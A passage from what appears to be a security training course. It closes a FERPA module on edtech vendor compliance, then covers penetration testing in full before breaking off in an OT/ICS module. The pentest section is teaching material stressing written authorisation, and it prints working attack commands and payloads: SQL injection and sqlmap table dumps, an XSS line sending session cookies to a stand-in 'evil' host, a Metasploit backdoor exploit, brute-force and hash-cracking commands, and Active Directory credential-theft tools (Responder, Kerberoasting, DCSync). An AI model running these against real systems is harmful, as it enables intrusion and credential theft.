vendor</div><p>To process records without per-parent consent, a vendor must meet ALL of these conditions: (1) it performs an institutional service or function for which the school would otherwise use employees; (2) it is under the direct control of the institution with respect to the use and maintenance of the records; (3) it uses the data only for the authorised purpose — no repurposing for product development, advertising, or resale; and (4) it does not re-disclose the data except as permitted. Every one of these must be locked into the contract/data-protection addendum.</p></div><h1 id=\"sec4\">4. The Vendor / Edtech Compliance Package</h1><h2>4.1 The data-protection addendum (build this)</h2><pre class=\"code\"><code>FERPA / STUDENT-DATA ADDENDUM — clauses a school will require\n 1. Designation as a 'school official' with a defined, limited purpose\n 2. Use restriction: data used ONLY to provide the contracted service\n 3. No secondary use: no advertising, profiling-for-marketing, or resale\n 4. No re-disclosure without the institution's authorisation\n 5. Security: encryption in transit/at rest, access control, logging\n 6. Sub-processors: flow-down of identical restrictions + approval\n 7. Breach notification to the institution within X hours\n 8. Return or destruction of all records on contract termination\n 9. Audit / cooperation rights for the institution\n10. Compliance with applicable STATE student-privacy laws (often stricter)</code></pre><h2>4.2 The compliance workflow</h2><ol><li><strong>Sign the addendum </strong>designating you a school official with defined, limited purposes.</li><li><strong>Minimise data </strong>— collect only the student data the service genuinely needs.</li><li><strong>Enforce no-secondary-use </strong>— technically separate any product-analytics from identifiable student data.</li><li><strong>Apply security safeguards </strong>— reuse the ISO 27001 / SOC 2 control set (encryption, RBAC, MFA, logging).</li><li><strong>Control sub-processors </strong>— flow the same restrictions to any downstream vendors; maintain an approved list.</li><li><strong>Plan breach response </strong>— notify the institution promptly per the contract; keep a breach register.</li><li><strong>Delete on exit </strong>— return or destroy records at contract end, with proof.</li></ol><h1 id=\"sec5\">5. Real-World Scenarios</h1><div class=\"callout info\"><div class=\"callout-title\">Scenario 1 — analytics repurposing</div><p><strong>Situation: </strong>a learning-analytics startup wants to use student performance data to train a recommendation model and also sell aggregate insights to publishers.</p><p><strong>Analysis: </strong>as a school official it may process the data to deliver its contracted service to the school. Using FERPA-protected data to build resale products or for advertising breaks the exception.</p><p><strong>Fix: </strong>contractually restrict use to the school's purpose; only use de-identified/aggregated data for anything else, and only with the institution's authorisation. De-identification must be genuine (no reasonable re-identification).</p></div><div class=\"callout info\"><div class=\"callout-title\">Scenario 2 — a breach at the vendor</div><p><strong>Situation: </strong>a vendor exposes a university's student records through a misconfigured storage bucket.</p><p><strong>Analysis: </strong>FERPA imposes no direct fine on the vendor, but the institution may be found non-compliant, can terminate the contract, and — critically — the Department of Education can bar the institution from sharing records with that vendor for at least five years. State breach-notification laws and the contract impose the direct, monetary liability.</p><p><strong>Lesson: </strong>the five-year ban is commercially fatal for an edtech vendor; security is existential, not optional.</p></div><div class=\"callout info\"><div class=\"callout-title\">Scenario 3 — parent of a 19-year-old</div><p><strong>Situation: </strong>a parent calls the college demanding their child's grades.</p><p><strong>Analysis: </strong>rights transferred to the student at 18 / college entry. The college generally cannot share grades with the parent without the now-eligible student's written consent — even though the parent pays tuition. (Limited exceptions exist, e.g. the student is a dependent for tax purposes, or a health/safety emergency.)</p><p><strong>Lesson: </strong>front-line staff getting this wrong is one of the most frequent FERPA violations; train them.</p></div><h1 id=\"sec6\">6. Overlapping Laws, Labs, and Q&amp;A</h1><h2>6.1 Laws that operate alongside FERPA</h2><ul><li><strong>COPPA (Children's Online Privacy Protection Act): </strong>protects the online privacy of children under 13; requires verifiable parental consent for collecting their data (schools can sometimes provide consent on parents' behalf strictly for educational use). Edtech for young children must satisfy both COPPA and FERPA.</li><li><strong>PPRA (Protection of Pupil Rights Amendment): </strong>governs surveys, evaluations, and marketing directed at students.</li><li><strong>State student-privacy laws: </strong>California's SOPIPA and many similar state laws impose stricter vendor obligations (e.g. outright bans on targeted advertising and on selling student data). These are frequently the binding constraint — stricter than FERPA itself.</li></ul><h2>6.2 Labs</h2><div class=\"callout info\"><div class=\"callout-title\">Lab 1 — Qualify as a school official (30 min)</div><p>Your SaaS auto-grades quizzes for a school district. Write the four conditions you must satisfy to be a 'school official' and draft the use-restriction clause you'd add to the contract.</p></div><div class=\"callout info\"><div class=\"callout-title\">Lab 2 — Spot the violation (20 min)</div><p>Which break FERPA? (a) Posting grades by full student name on a public web page; (b) sharing a transcript with a school the student is transferring to; (c) emailing a 20-year-old's grades to their parent without consent; (d) using identifiable student data to train an advertising model. (Answers: a, c, d violate; b is a permitted exception.)</p></div><div class=\"callout info\"><div class=\"callout-title\">Lab 3 — Directory-information notice (20 min)</div><p>Draft a directory-information notice that lists exactly which fields are disclosable, and explains how a parent/eligible student opts out and by when.</p></div><div class=\"callout info\"><div class=\"callout-title\">Lab 4 — De-identification check (30 min)</div><p>Your team wants to publish 'anonymous' class-performance stats. For a class of 6 students, explain why small-cell aggregates can still re-identify individuals, and define the minimum cell size / suppression rule you'd require.</p></div><h2>6.3 Q&amp;A</h2><ul><li><strong>Q: Define an education record and name two exclusions. </strong>A: Records directly related to a student and maintained by the institution; excludes sole-possession notes and law-enforcement unit records.</li><li><strong>Q: When do rights transfer to the student? </strong>A: At age 18 or on enrolling in a post-secondary institution.</li><li><strong>Q: The four 'school official' conditions? </strong>A: Performs a school function; under the school's direct control; uses data only for the authorised purpose; no re-disclosure.</li><li><strong>Q: A use that breaks the exception? </strong>A: Repurposing identifiable student data for advertising, profiling-for-marketing, or resale.</li><li><strong>Q: What can the Department of Education do to a non-compliant arrangement? </strong>A: Among other things, bar the institution from sharing records with the offending vendor for at least five years; ultimately withhold federal funding.</li><li><strong>Q: Two laws that overlap with FERPA? </strong>A: COPPA (under-13s online) and state student-privacy laws like SOPIPA (often stricter).</li></ul><div class=\"callout info\"><div class=\"callout-title\">Mastery check</div><p>1. Classify records as covered vs excluded, and define directory information + opt-out.</p><p>2. State when rights transfer and the parent-of-an-adult rule.</p><p>3. Draft the four 'school official' conditions and the use-restriction clause.</p><p>4. Identify FERPA violations in a scenario set.</p><p>5. Explain the five-year vendor ban and why security is existential.</p><p>6. Name the overlapping laws and why state laws often bind tighter.</p></div>","sections":[{"id":"sec1","title":"1. What FERPA Is and Why It Reaches You"},{"id":"sec2","title":"2. What Counts as an Education Record"},{"id":"sec3","title":"3. Rights and the Consent Rule"},{"id":"sec4","title":"4. The Vendor / Edtech Compliance Package"},{"id":"sec5","title":"5. Real-World Scenarios"},{"id":"sec6","title":"6. Overlapping Laws, Labs, and Q&A"}]},{"id":"07","navTitle":"VAPT","title":"VAPT","subtitle":"Vulnerability Assessment & Penetration Testing","html":"<h1 id=\"sec1\">1. Foundations — Start Here</h1><p><strong>VAPT (Vulnerability Assessment and Penetration Testing)</strong> bundles two complementary disciplines. A <strong>vulnerability assessment (VA)</strong> is breadth-first: it enumerates as many weaknesses as possible, mostly with automated scanners, producing a prioritised list (with false positives). A <strong>penetration test (PT)</strong> is depth-first: a human attacker manually exploits selected weaknesses to prove real-world impact — chaining low-severity issues into a serious breach the way a real adversary would. Buyers want both answers: “what is wrong?” (VA) and “what can someone actually do with it?” (PT).</p><div class=\"tbl-wrap\"><table><thead><tr><th>Dimension</th><th>Vulnerability Assessment</th><th>Penetration Test</th></tr></thead><tbody><tr><td>Goal</td><td>Breadth — find all known weaknesses</td><td>Depth — prove exploitable impact</td></tr><tr><td>Method</td><td>Mostly automated scanning</td><td>Manual + tools + human creativity</td></tr><tr><td>Output</td><td>Prioritised list of findings</td><td>Attack narrative + proof-of-concept + impact</td></tr><tr><td>Validation</td><td>Unvalidated (false positives)</td><td>Confirmed exploitable</td></tr><tr><td>Frequency</td><td>Frequent (monthly/quarterly)</td><td>Periodic (annual / per release)</td></tr><tr><td>Cost / time</td><td>Low / fast</td><td>Higher / slower</td></tr></tbody></table></div><h2>1.1 Knowledge levels (how much the tester is told)</h2><ul><li><strong>Black box: </strong>no internal knowledge — simulates an external attacker starting from zero. Realistic but slower; may miss deep issues.</li><li><strong>Grey box: </strong>partial knowledge — typically a low-privilege account and some architecture detail. The best value-to-coverage ratio; most engagements are grey box.</li><li><strong>White box: </strong>full knowledge — source code, configs, architecture. Deepest coverage, fastest; ideal for secure-code review and critical systems.</li></ul><h2>1.2 Engagement targets</h2><ul><li>External network (internet-facing) · Internal network (assumed-breach / on-LAN) · Web application · API · Mobile app · Wireless · Cloud · Social engineering · Physical · full Red Team (objective-based, stealthy).</li></ul><div class=\"callout warn\"><div class=\"callout-title\">Rule zero — authorisation before a single packet</div><p>Unauthorised access is a crime. In India it is governed by the Information Technology Act, 2000 — §43 (civil liability for unauthorised access/damage) and §66 (criminal). Never test anything without: a signed scope and target list (IPs/domains), an explicit time window, an emergency contact, defined stop conditions, and written authorisation from someone empowered to grant it. “I was only testing” is not a legal defence. This applies to every later section — every command assumes you have written permission for that target.</p></div><h1 id=\"sec2\">2. Methodology and the Engagement Lifecycle</h1><p>Professionals anchor every engagement to a recognised methodology and cite it in the report. The major ones:</p><ul><li><strong>PTES </strong>(Penetration Testing Execution Standard) — the 7-phase lifecycle below; the most common backbone.</li><li><strong>OWASP WSTG </strong>(Web Security Testing Guide) — the canonical web-app test catalogue; <strong>OWASP MASVS/MASTG </strong>for mobile.</li><li><strong>NIST SP 800-115 </strong>— the US technical testing guide; <strong>OSSTMM </strong>— a metrics-driven methodology.</li><li><strong>MITRE ATT&amp;CK </strong>— a knowledge base of real adversary tactics/techniques; used to structure red-team operations and map findings to real-world TTPs.</li></ul><h2>2.1 The PTES phases</h2><ol><li><strong>Pre-engagement interactions </strong>— scope, rules of engagement, authorisation, goals, timelines.</li><li><strong>Intelligence gathering </strong>— passive then active reconnaissance.</li><li><strong>Threat modeling </strong>— identify what matters most and how a real attacker would approach it.</li><li><strong>Vulnerability analysis </strong>— correlate discovered services with known CVEs and misconfigurations; remove false positives.</li><li><strong>Exploitation </strong>— safely prove the vulnerability is real and reachable.</li><li><strong>Post-exploitation </strong>— assess true impact: privilege escalation, lateral movement, data access, persistence.</li><li><strong>Reporting </strong>— the deliverable the client pays for; findings, evidence, risk, remediation.</li></ol><h2>2.2 Rules of Engagement (RoE) — what the document contains</h2><ul><li>In-scope and explicitly out-of-scope targets (IP ranges, domains, apps); testing window (dates/hours); permitted techniques (e.g. no DoS, no social engineering unless agreed); data-handling rules; points of contact and escalation; stop conditions (what halts the test); and the authorisation signature.</li></ul><h1 id=\"sec3\">3. Reconnaissance and Enumeration</h1><p>Enumeration is roughly 70% of a real test. Beginners rush to exploits; professionals map every host, port, service, version, virtual host, parameter, and account first — because most footholds come from a forgotten service, a default credential, or an exposed panel, not a flashy 0-day.</p><h2>3.1 Passive recon (no packets to the target)</h2><pre class=\"code\"><code># Subdomain discovery\nsubfinder -d target.com -silent | tee subs.txt\namass enum -passive -d target.com\n# Resolve + probe which are live\ndnsx -l subs.txt -resp -a | tee resolved.txt\nhttpx -l subs.txt -title -tech-detect -status-code\n# Certificate transparency (reveals hidden subdomains)\ncurl -s 'https://crt.sh/?q=%25.target.com&amp;output=json' | jq -r '.[].name_value' | sort -u\n# Tech fingerprint, emails, exposed data\nwhatweb https://target.com ; theHarvester -d target.com -b all\n# Leaked secrets in public repos\ntrufflehog github --org=target</code></pre><h2>3.2 Active scanning</h2><pre class=\"code\"><code># Host discovery\nnmap -sn 10.10.10.0/24                                  # live hosts (ping sweep)\n# Full TCP port + service/version + OS\nnmap -sS -sV -O -p- --min-rate 3000 -oA scans/full TARGET\n# Common UDP\nnmap -sU --top-ports 50 TARGET\n# Targeted NSE scripts (safe vuln checks)\nnmap --script 'vuln and safe' -p 80,443,445 TARGET\n# Web content &amp; vhost discovery\nffuf -u https://TARGET/FUZZ -w raft-medium-directories.txt -mc 200,301,403 -t 60\nferoxbuster -u https://TARGET -w common.txt -x php,bak,old,zip\n# Fast templated checks across the surface\nnuclei -l resolved.txt -severity medium,high,critical</code></pre><h2>3.3 Service enumeration cheatsheet</h2><div class=\"tbl-wrap\"><table><thead><tr><th>Port/Service</th><th>What to do</th></tr></thead><tbody><tr><td>21 FTP</td><td>Try anonymous login; check version CVEs</td></tr><tr><td>22 SSH</td><td>Version; key-based vs password; user enum</td></tr><tr><td>80/443 HTTP(S)</td><td>Content discovery; tech; OWASP testing</td></tr><tr><td>139/445 SMB</td><td>Shares (smbclient/nxc); null sessions; EternalBlue era CVEs</td></tr><tr><td>3389 RDP</td><td>NLA; weak creds; BlueKeep-era CVEs</td></tr><tr><td>1433/3306/5432 DBs</td><td>Default creds; exposed to internet?</td></tr><tr><td>161 SNMP</td><td>Community strings ('public'); device info</td></tr></tbody></table></div><h1 id=\"sec4\">4. Web Application Testing — OWASP Top 10 (2021), In Depth</h1><p>Web apps are the most common engagement. Memorise the Top 10 — it is the shared language of the field — and know how to test each.</p><div class=\"tbl-wrap\"><table><thead><tr><th>ID</th><th>Category</th><th>How to test it</th></tr></thead><tbody><tr><td>A01</td><td>Broken Access Control</td><td>IDOR (change object IDs); force-browse /admin; verb tampering; JWT 'none'</td></tr><tr><td>A02</td><td>Cryptographic Failures</td><td>Weak/again TLS; cookies missing Secure/HttpOnly; plaintext storage</td></tr><tr><td>A03</td><td>Injection</td><td>SQLi, NoSQLi, command, LDAP, template (SSTI), and XSS via every input</td></tr><tr><td>A04</td><td>Insecure Design</td><td>Business-logic abuse; missing rate-limits; race conditions</td></tr><tr><td>A05</td><td>Security Misconfig</td><td>Default creds; dir listing; verbose errors; open cloud buckets</td></tr><tr><td>A06</td><td>Vulnerable Components</td><td>Fingerprint libraries; match to CVEs</td></tr><tr><td>A07</td><td>Auth Failures</td><td>Weak passwords; no lockout; session fixation; password-reset flaws</td></tr><tr><td>A08</td><td>Integrity Failures</td><td>Insecure deserialization; unsigned updates; CI/CD trust</td></tr><tr><td>A09</td><td>Logging/Monitoring</td><td>Do attacks leave traces / trigger alerts?</td></tr><tr><td>A10</td><td>SSRF</td><td>Force the server to fetch attacker URLs / cloud metadata</td></tr></tbody></table></div><h2>4.1 SQL injection — manual to automated</h2><pre class=\"code\"><code># 1) Detect: break the query, watch for error or behaviour change\nid=1'      id=1\"     id=1)      id=1 OR 1=1-- -      id=1 AND 1=2-- -\n# 2) Auth bypass in a login field\nusername:  admin'-- -        password:  anything\n# 3) Find column count, then UNION-extract\n?id=1 ORDER BY 5-- -                         # error tells you the count\n?id=-1 UNION SELECT 1,version(),database(),4,5-- -\n# 4) Blind (boolean / time-based) when no output is reflected\n?id=1 AND (SELECT SUBSTRING(version(),1,1))='8'-- -\n?id=1 AND SLEEP(5)-- -                        # time-based confirms blind SQLi\n# 5) Automate extraction (authorised targets ONLY)\nsqlmap -u 'https://t/item?id=1' --batch --dbs --threads=4\nsqlmap -u 'https://t/item?id=1' -D appdb -T users --dump</code></pre><h2>4.2 Cross-site scripting (XSS) — the three types</h2><ul><li><strong>Reflected: </strong>input echoed back unescaped in the immediate response (e.g. a search term).</li><li><strong>Stored: </strong>input persisted and served to other users (e.g. a comment) — most dangerous.</li><li><strong>DOM-based: </strong>client-side JS writes attacker-controlled data into a dangerous sink (innerHTML, eval).</li></ul><pre class=\"code\"><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;           # basic proof\n\"&gt;&lt;img src=x onerror=alert(1)&gt;                     # attribute breakout\n&lt;svg/onload=fetch('//evil/c?'+document.cookie)&gt;    # session-theft impact\n# DOM XSS: trace source (location.hash/search) -&gt; sink (innerHTML/eval)</code></pre><h2>4.3 Other high-value web tests</h2><ul><li><strong>IDOR (A01): </strong>change /api/user/123/invoice to /124 — do you get someone else's data?</li><li><strong>SSRF (A10): </strong>submit a URL the server fetches; point it at http://169.254.169.254/ (cloud metadata) or internal services.</li><li><strong>SSTI: </strong>inject template syntax (e.g. {{7*7}} → 49) into inputs rendered by a template engine; can lead to RCE.</li><li><strong>Auth/session: </strong>test lockout, password-reset token predictability, JWT signature validation, session fixation.</li></ul><h2>4.4 The web tester's toolkit</h2><ul><li><strong>Burp Suite </strong>— the proxy: intercept (Proxy), modify/replay (Repeater), fuzz (Intruder), automate (extensions), scan (Pro).</li><li><strong>ffuf / feroxbuster </strong>(content &amp; parameter discovery); <strong>nuclei </strong>(templated checks); <strong>sqlmap </strong>(SQLi); <strong>jwt_tool </strong>(token attacks).</li></ul><h1 id=\"sec5\">5. Exploitation and Network Services</h1><p>Exploitation proves a vulnerability is real and reachable. In a professional test you exploit to demonstrate impact, never to cause damage — capture proof (a screenshot, a hash, a benign file) and stop.</p><h2>5.1 Finding and running exploits</h2><pre class=\"code\"><code># Find a public exploit for a fingerprinted version\nsearchsploit apache 2.4.49\nsearchsploit -m 50383          # copy the exploit locally to read it\n# Metasploit workflow\nmsfconsole -q\n  search type:exploit name:vsftpd\n  use exploit/unix/ftp/vsftpd_234_backdoor\n  set RHOSTS TARGET ; set LHOST YOUR_IP ; run\n# Always READ an exploit before running it on a client system.</code></pre><h2>5.2 Credential attacks</h2><pre class=\"code\"><code># Online brute/spray (mind lockout policies!)\nhydra -L users.txt -P passwords.txt ssh://TARGET -t 4\nnxc smb TARGET -u users.txt -p 'Winter2026!' --continue-on-success  # password spray\n# Offline cracking of captured hashes\nhashcat -m 1000 ntlm.hashes rockyou.txt -r rules/best64.rule    # NTLM\nhashcat -m 1800 shadow.hashes rockyou.txt                        # sha512crypt\njohn --format=NT ntlm.hashes --wordlist=rockyou.txt</code></pre><p><strong>Password spraying vs brute force: </strong>spraying tries ONE common password against MANY accounts to avoid lockout; brute force tries many passwords against one account (and trips lockout fast). Spraying is the realistic enterprise technique.</p><h1 id=\"sec6\">6. Active Directory — Where Internal Tests Live</h1><p>Most enterprises run on Active Directory (AD). Internal engagements almost always become AD engagements. Learn this chain cold — it is the heart of modern penetration testing.</p><h2>6.1 The AD attack chain</h2><ol><li><strong>Enumerate </strong>— from an unauthenticated or low-priv position: users, groups, shares, password policy, trusts.</li><li><strong>Harvest credentials </strong>— LLMNR/NBT-NS poisoning (Responder), Kerberoasting, AS-REP roasting.</li><li><strong>Map attack paths </strong>— BloodHound graphs the shortest route from your foothold to Domain Admin via ACLs, sessions, and group membership.</li><li><strong>Move laterally </strong>— pass-the-hash / pass-the-ticket; remote execution via WMI/SMB/WinRM.</li><li><strong>Escalate to domain dominance </strong>— DCSync to pull all domain hashes from a Domain Controller; demonstrate, do not destroy.</li></ol><h2>6.2 Key techniques explained</h2><ul><li><strong>Kerberoasting: </strong>any domain user can request service tickets (TGS) for accounts with a Service Principal Name; the ticket is encrypted with the service account's password hash, which you crack offline. Service accounts often have weak, non-expiring passwords.</li><li><strong>AS-REP roasting: </strong>accounts with “do not require pre-authentication” set will hand you a crackable hash without any credentials.</li><li><strong>LLMNR/NBT-NS poisoning: </strong>Responder answers broadcast name-resolution requests, capturing NetNTLM hashes you then crack or relay.</li><li><strong>Pass-the-Hash: </strong>authenticate with an NTLM hash directly, no plaintext needed.</li><li><strong>DCSync: </strong>with replication rights, ask a DC to replicate password data — effectively dumping every hash including the krbtgt (enabling Golden Tickets).</li></ul><pre class=\"code\"><code># Practical AD commands (authorised lab only)\nnxc smb 10.0.0.0/24 -u user -p 'pass' --shares          # enumerate shares\nGetUserSPNs.py DOM/user:pass -dc-ip DC -request           # Kerberoast\nGetNPUsers.py DOM/ -usersfile users.txt -no-pass          # AS-REP roast\nresponder -I eth0                                          # capture NetNTLM\nbloodhound-python -d DOM -u user -p pass -c All            # collect graph\nnxc smb DC -u admin -H &lt;NTLMhash&gt;                          # pass-the-hash\nsecretsdump.py DOM/admin:pass@DC                           # DCSync (if privd)</code></pre><p><strong>BloodHound is the force multiplier: </strong>it ingests the collected data and visually shows the shortest path (“Shortest Path to Domain Admins”) so you attack the right edges instead of guessing.</p><h1 id=\"sec7\">7. Privilege Escalation and Post-Exploitation</h1><h2>7.1 Linux privilege escalation — what to check</h2><pre class=\"code\"><code>id ; sudo -l                       # what can I run as root?\nfind / -perm -4000 2&gt;/dev/null     # SUID binaries (GTFOBins)\ncat /etc/crontab ; ls -la /etc/cron.*   # writable cron jobs\nuname -a                            # kernel version -&gt; known exploits\ngetcap -r / 2&gt;/dev/null            # capabilities\n# Automate: linpeas.sh</code></pre><ul><li><strong>Common Linux vectors: </strong>misconfigured sudo (NOPASSWD on an exploitable binary), SUID binaries abusable via GTFOBins, writable cron jobs, weak file permissions on sensitive files, kernel exploits, exposed credentials in config files.</li></ul><h2>7.2 Windows privilege escalation — what to check</h2><ul><li><strong>Common Windows vectors: </strong>unquoted service paths, weak service permissions (modify a service binary), AlwaysInstallElevated, stored credentials (cmdkey, registry, SAM), token impersonation (SeImpersonate → Potato attacks), DLL hijacking, scheduled-task abuse. Automate enumeration with winPEAS.</li></ul><h2>7.3 Post-exploitation goals (demonstrate, don't damage)</h2><ul><li><strong>Privilege escalation </strong>— from user to root/SYSTEM/admin.</li><li><strong>Lateral movement </strong>— pivot to other hosts using harvested creds/hashes.</li><li><strong>Data access </strong>— prove you could reach crown-jewel data (screenshot a record, not exfiltrate the database).</li><li><strong>Persistence (simulated) </strong>— show you could maintain access; never leave real backdoors on a client system.</li></ul><h2>7.4 CVSS — scoring severity</h2><p><strong>CVSS (Common Vulnerability Scoring System) </strong>produces a 0–10 score from metrics: Attack Vector (network/adjacent/local/physical), Attack Complexity, Privileges Required, User Interaction, and the Confidentiality/Integrity/Availability impacts. Bands: 0.1–3.9 Low, 4.0–6.9 Medium, 7.0–8.9 High, 9.0–10 Critical. Always temper the raw score with business context — a Medium on a crown-jewel database can outrank a High on a throwaway test server. Report the CVSS vector string so the client can recompute with their own environmental metrics.</p><h1 id=\"sec8\">8. Reporting — The Actual Deliverable</h1><p>Clients pay for the report, not the hacking. A finding must let a developer fix the issue without you in the room. Use this structure for every finding:</p><div class=\"callout info\"><div class=\"callout-title\">Finding template (copy this)</div><p><strong>Title: </strong>SQL injection in /search (parameter q)</p><p><strong>Severity: </strong>Critical — CVSS 9.8 (vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</p><p><strong>Affected asset: </strong>https://app.client.com/search</p><p><strong>Description: </strong>The q parameter is concatenated directly into a SQL query without parameterisation.</p><p><strong>Evidence / PoC: </strong>Request + response screenshots; payload q=1' UNION SELECT ... dumping the users table (redacted).</p><p><strong>Impact: </strong>Full read of the application database including password hashes; potential RCE via stacked queries.</p><p><strong>Remediation: </strong>Use parameterised queries / prepared statements; apply least-privilege DB account; add a WAF as defence-in-depth.</p><p><strong>References: </strong>OWASP A03:2021; CWE-89.</p></div><h2>8.1 Report structure</h2><ol><li><strong>Executive summary </strong>— risk posture in business language for leadership; no jargon.</li><li><strong>Scope &amp; methodology </strong>— what was/ wasn't tested, dates, the standard used.</li><li><strong>Findings </strong>— each rated, with the template above; ordered by severity.</li><li><strong>Detailed evidence / walkthrough </strong>— reproduction steps and proof.</li><li><strong>Remediation roadmap </strong>— prioritised fixes (critical/high first).</li><li><strong>Retest results </strong>— confirmation that fixes actually closed the issues.</li></ol><h1 id=\"sec9\">9. Progressive Labs (Legal &amp; Free)</h1><div class=\"callout info\"><div class=\"callout-title\">Beginner — first web vulnerabilities</div><p>Set up a Kali VM. Complete PortSwigger Web Security Academy's SQL-injection and reflected-XSS apprentice labs. For each: detect, exploit, capture a PoC, and write a one-paragraph finding using the Section 8 template.</p></div><div class=\"callout info\"><div class=\"callout-title\">Beginner-Intermediate — own a Linux box</div><p>On TryHackMe or HackTheBox, take a beginner box end to end: enumerate (nmap + ffuf) → foothold via a web vuln or weak service → local privilege escalation (sudo -l, SUID, cron, kernel). Document the full chain with commands.</p></div><div class=\"callout info\"><div class=\"callout-title\">Intermediate — internal network</div><p>Run an assumed-breach scenario: from a low-priv shell, enumerate the subnet, harvest credentials, and pivot to a second host. Practise nxc, Responder, and hash cracking.</p></div><div class=\"callout info\"><div class=\"callout-title\">Advanced — Active Directory to Domain Admin</div><p>On an AD lab (TryHackMe 'Attacktive Directory', HTB Pro Labs, or the free GOAD lab): enumerate users, Kerberoast a service account, crack it, map with BloodHound, move laterally, and reach Domain Admin via DCSync. Produce an attack-path diagram and a full report.</p></div><h2>9.1 Practice platforms</h2><ul><li>TryHackMe, HackTheBox, PortSwigger Web Security Academy (free), VulnHub, OWASP Juice Shop, DVWA, Metasploitable, GOAD (Game of Active Directory).</li></ul><h1 id=\"sec10\">10. Career, Certifications, and Q&amp;A</h1><h2>10.1 Certifications by level</h2><ul><li><strong>Foundational: </strong>PortSwigger (free), eJPT, CEH (theory-heavy).</li><li><strong>Hands-on standard: </strong>OSCP (the field benchmark), PNPT, CRTP (Active Directory focus).</li><li><strong>Advanced: </strong>OSEP (evasion/AD), OSWE (web exploitation), CRTO (red team operations).</li></ul><h2>10.2 Legal reminders (India)</h2><ul><li>Signed scope + RoE before testing; stay strictly in scope; protect and then destroy client data; have stop conditions for production-impacting tests; IT Act 2000 governs unauthorised access (§43/§66).</li></ul><h2>10.3 Q&amp;A</h2><ul><li><strong>Q: VA vs PT? </strong>A: Breadth/automated/unvalidated vs depth/manual/proven-exploitable.</li><li><strong>Q: First step of any engagement? </strong>A: Written authorisation + Rules of Engagement.</li><li><strong>Q: Black/grey/white box? </strong>A: No knowledge / partial (low-priv account) / full (source + configs).</li><li><strong>Q: Explain Kerberoasting. </strong>A: Request a TGS for an SPN account; crack the hash offline to recover the service-account password.</li><li><strong>Q: Password spraying vs brute force? </strong>A: One password against many accounts (avoids lockout) vs many passwords against one account.</li><li><strong>Q: What is DCSync? </strong>A: Abusing replication rights to make a DC hand over password hashes — effectively dumping the domain.</li><li><strong>Q: What goes in a finding? </strong>A: Title, severity/CVSS vector, affected asset, description, PoC, impact, remediation, references.</li><li><strong>Q: One Linux and one Windows privesc vector? </strong>A: Linux: sudo NOPASSWD on a GTFOBins binary. Windows: unquoted service path or SeImpersonate (Potato).</li></ul><h2>10.4 Cheat sheet</h2><p><strong>PTES: pre-engage → recon → threat model → vuln analysis → exploit → post-exploit → report. </strong>OWASP Top 10 is the web language. AD chain: enumerate → roast → BloodHound → lateral → DCSync. CVSS: 0–10, four bands. Always: written authorisation, stay in scope, demonstrate not destroy.</p><div class=\"callout info\"><div class=\"callout-title\">Mastery check</div><p>1. Run a recon-to-enumeration sweep and list the full attack surface.</p><p>2. Detect and exploit SQLi + XSS in a lab and write findings.</p><p>3. Take a box from foothold to root via privilege escalation.</p><p>4. Reach Domain Admin on an AD lab and diagram the path.</p><p>5. Score a finding with a CVSS vector and justify the business rating.</p><p>6. Write a complete report section: exec summary + one critical finding.</p></div>","sections":[{"id":"sec1","title":"1. Foundations — Start Here"},{"id":"sec2","title":"2. Methodology and the Engagement Lifecycle"},{"id":"sec3","title":"3. Reconnaissance and Enumeration"},{"id":"sec4","title":"4. Web Application Testing — OWASP Top 10 (2021), In Depth"},{"id":"sec5","title":"5. Exploitation and Network Services"},{"id":"sec6","title":"6. Active Directory — Where Internal Tests Live"},{"id":"sec7","title":"7. Privilege Escalation and Post-Exploitation"},{"id":"sec8","title":"8. Reporting — The Actual Deliverable"},{"id":"sec9","title":"9. Progressive Labs (Legal & Free)"},{"id":"sec10","title":"10. Career, Certifications, and Q&A"}]},{"id":"08","navTitle":"OT / ICS Security","title":"OT / ICS Security","subtitle":"Industrial Control System Security & Pentesting","html":"<h1 id=\"sec1\">1. Foundations — Start Here</h1><p><strong>Operational Technology (OT)</strong> is the hardware and software that monitors and controls physical processes — power generation and distribution, water treatment, manufacturing lines, oil &amp; gas, building management, and transport. <strong>Industrial Control Systems (ICS)</strong> are the control elements within OT: SCADA, DCS, PLCs, and RTUs. The stakes are different from IT: an OT failure is not a leaked spreadsheet — it is a stopped production line, an overflowing tank, a tripped substation, or a safety incident that can injure or kill.</p><div class=\"callout info\"><div class=\"callout-title\">The one idea that drives everything: AIC, not CIA</div><p><strong>IT prioritises Confidentiality &gt; Integrity &gt; Availability. OT inverts this to Availability &gt; Integrity &gt; Confidentiality (AIC).</strong> A turbine controller cannot be casually patched and rebooted; a refinery line cannot go down for a vulnerability scan. Safety and uptime dominate every decision. Internalise this inversion and roughly 80% of OT security practice follows logically — including why you never scan production aggressively and why patching is slow and risk-managed.</p></div><h2>1.1 Why OT security is uniquely hard</h2><ul><li><strong>Long lifecycles: </strong>equipment runs 15–30 years. Windows XP/7, unsupported firmware, and unpatchable PLCs are normal, not exceptional.</li><li><strong>Insecure-by-design protocols: </strong>Modbus, DNP3, and others were built for trusted, isolated networks — no authentication, no encryption.</li><li><strong>Availability &amp; safety first: </strong>you cannot take a live process offline to scan, patch, or reboot at will; change windows are rare and tightly controlled.</li><li><strong>Fragile devices: </strong>PLCs can crash or fault from unexpected traffic that an IT server would shrug off.</li><li><strong>IT/OT convergence: </strong>once air-gapped networks are now connected to IT and the internet for efficiency and remote support, vastly expanding the attack surface.</li><li><strong>Different stakeholders: </strong>plant engineers, not IT, own these systems; security must be done WITH engineering, never imposed on it.</li></ul><h1 id=\"sec2\">2. Architecture — The Purdue Model</h1><p>Every OT security conversation maps onto the Purdue Enterprise Reference Architecture. It segments systems into levels; controlling and monitoring traffic BETWEEN levels is the primary defence.</p><div class=\"tbl-wrap\"><table><thead><tr><th>Level</th><th>Name</th><th>What lives there</th></tr></thead><tbody><tr><td>0</td><td>Physical process</td><td>Sensors &amp; actuators (valves, motors, gauges, drives)</td></tr><tr><td>1</td><td>Basic control</td><td>PLCs, RTUs — read sensors, drive actuators in real time</td></tr><tr><td>2</td><td>Area supervisory</td><td>SCADA servers, HMIs (operator screens), engineering stations</td></tr><tr><td>3</td><td>Site operations</td><td>Historians, MES, production scheduling, OT domain services</td></tr><tr><td>3.5</td><td>Industrial DMZ (iDMZ)</td><td>The buffer between OT and IT — the crown control</td></tr><tr><td>4</td><td>Site business</td><td>Plant business systems, email, file servers</td></tr><tr><td>5</td><td>Enterprise</td><td>Corporate IT, ERP, internet</td></tr></tbody></table></div><div class=\"callout info\"><div class=\"callout-title\">The Industrial DMZ (Level 3.5) is the single most 